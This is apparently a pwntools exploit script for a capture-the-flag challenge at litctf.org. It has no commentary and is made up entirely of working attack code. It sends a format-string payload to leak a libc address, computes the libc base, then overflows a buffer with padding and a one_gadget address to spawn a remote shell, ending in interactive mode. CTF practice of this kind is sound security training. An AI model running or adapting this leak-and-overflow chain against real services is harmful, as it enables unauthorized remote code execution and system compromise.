from pwn import *

context.binary = exe = ELF('./s')
libc = ELF('./libc.so.6')

one = 0xe3b01

#io = process()
#gdb.attach(io, api=True)
io = remote('litctf.org', 31790)

payload = b'%12$p ' + b'i'*41 + b'\x69'
io.sendline(payload)
io.recvuntil(b'0x')
libc.address = int(io.recvuntil(b' '), 16) - (libc.sym['__libc_start_main']+243)
log.info(f'Libc base: {hex(libc.address)}') # If libc base ends with c000 = poggers
io.recvline()
payload = b'i'*56 + p64(libc.address+one)
io.sendline(payload)
io.interactive()